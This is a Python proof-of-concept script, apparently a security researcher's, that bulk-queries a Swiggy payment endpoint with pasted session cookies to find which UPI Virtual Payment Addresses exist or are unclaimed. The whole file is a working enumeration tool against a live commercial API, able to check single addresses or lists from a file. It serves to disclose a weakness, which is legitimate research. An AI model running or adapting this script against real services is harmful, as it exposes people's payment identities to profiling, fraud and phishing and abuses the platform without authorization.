#!/usr/bin/python

import sys
import io
import signal
import requests
import argparse

print('''

            _            _    _ _____ _____
           (_)          | |  | |  __ \_   _|
  ___ _ __  _ _ __   ___| |  | | |__) || |
 / __| '_ \| | '_ \ / _ \ |  | |  ___/ | |
 \__ \ | | | | |_) |  __/ |__| | |    _| |_
 |___/_| |_|_| .__/ \___|\____/|_|   |_____|
             | |
             |_|

	# Author: Karan Saini (@squeal)
	# URL: https://github.com/qurbat/snipeUPI
	# Description:	A Proof of Concept script for querying and discovering existing and\n 			unclaimed Unified Payment Interface (UPI) Virtual Payment Addresses.\n
	# Usage:	snipeUPI.py -a example@handle [query a single address]	\n			snipeUPI.py -f example.txt [query addresses from file]
''')
# universal
not_valid = b'Session expired'  # session not valid
isvpavalid = b'true' #  address exists
isnvpaotvalid = b'false' # address does not exist

def keyboardInterruptHandler(signal, frame):
    print("Interrupted! Quitting...".format(signal))
    exit(0)

signal.signal(signal.SIGINT, keyboardInterruptHandler)

# headers
headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT x.y; rv:10.0) Gecko/20100101 Firefox/10.0',
	'Cookie': '_cookie1=EDIT; _cookie2=THESE; _cookie3=VALUES'
}

# BASE_URI = https://www.swiggy.com/dapi/payment/upi/verify-vpa

def single_query(sAddress):
	print("[-] Running a single query...")
	spayload = {'vpaAddress': sAddress}
	sr = requests.get('https://www.swiggy.com/dapi/payment/upi/verify-vpa', params=spayload, headers=headers, timeout=10)
	if not_valid in sr.content: # if session is not valid
		print("Session is not valid. Please check your cookies...")
		sys.exit()
	if isvpavalid in sr.content: # if VPA exists
		print(sAddress + " already exists.") # print YES
		sys.exit()
	elif isnvpaotvalid in sr.content: # if VPA does not exist
		print(sAddress + " is available!") # print NO
		sys.exit()


# multiple queries
# read file
def multiple_queries(infile):
	print ("[-] Querying multiple addresses...")
	with io.open(infile) as f:
		for line in f:
			mAddress =  line.strip('\n')
			mPayload = {'vpaAddress': mAddress}
			mr = requests.get('https://www.swiggy.com/dapi/payment/upi/verify-vpa', params=mPayload, headers=headers)
			if not_valid in mr.content: # if session is not valid
				print("Session is not valid. Please check your cookies...")
				f.close()
				sys.exit()
			if isvpavalid in mr.content: # if VPA exists
				print(mAddress + " already exists.") # print YES
			elif isnvpaotvalid in mr.content: # if VPA does not exist
				print(mAddress + " is available!") # print NO


# main_b
if __name__ == '__main__':
	parse = argparse.ArgumentParser()
	mu = parse.add_mutually_exclusive_group()
	mu.add_argument('-a', '--address', type=str, default='', help='query a single payment address')
	mu.add_argument('-f', '--file', type=str,default='', help='query multiple payment addresses from file')

	args = parse.parse_args()

	address = args.address
	filename = args.file

	if len(sys.argv) == 1:
		print("Please provide an argument! [use -h for help]")
		sys.exit()
	elif address:
		single_query(address)
	elif filename:
		multiple_queries(filename)
	else:
		mu.print_help()
		sys.exit()

	print("[+] Job finished!")

# ======
# ======
# ======
